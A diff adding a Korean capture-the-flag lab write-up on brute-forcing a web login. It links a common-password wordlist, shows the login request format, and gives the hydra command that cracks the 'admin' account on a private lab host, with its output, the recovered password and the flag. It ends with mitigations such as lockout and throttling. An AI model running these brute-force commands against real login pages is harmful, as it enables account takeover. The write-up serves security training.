@@ -1,0 +1,33 @@
+쉬운 비밀번호는 계속해서 시도하다 보면 털리게 되어있다.
+
+#자주쓰는 비밀번호 1000개 파일 다운로드
+https://github.com/danielmiessler/SecLists/blob/master/Passwords/darkweb2017-top1000.txt
+
+#개발자도구에서 asd/asd로 로그인 하면 어떤 형식으로 request되는지 알 수 있다. 
+GET http://192.168.123.158/?page=signin&username=asd&password=asd&Login=Login#
+
+hydra for BFL
+https://m.blog.naver.com/PostView.nhn?blogId=koromoon&logNo=220794488011&proxyReferer=https:%2F%2Fwww.google.com%2F
+
+brew install hydra
+
+hydra -l admin  -P pass.txt 192.168.123.158 http-get-form "/:page=signin&username=^USER^&password=^PASS^&Login=Login:Wrong"
+
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-28 11:16:27
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 999 login tries (l:1/p:999), ~63 tries per task
+[DATA] attacking http-get-form://192.168.123.158:80/:page=signin&username=^USER^&password=^PASS^&Login=Login:Wrong
+[80][http-get-form] host: 192.168.123.158   login: admin   password: shadow
+1 of 1 target successfully completed, 1 valid password found
+
+#login admin/shadow
+flag
+B3A6E43DDF8B4BBB4125E5E7D23040433827759D4DE1C04EA63907479A80A6B2
+
+#대응방안 
+유추 가능한 관리자 이름 사용 안 하기 + 쉬운 비밀번호 쓰지 않기
+
+root, admin, sysadm 같은 유추 가능한 관리자 이름을 사용하지 않아야 한다.
+
+일정 횟수 이상의 login 실패시 계정이 잠기거나 정해진 시간이후에 시도 가능한 login throttling 기능등을 적용해야 합니다.
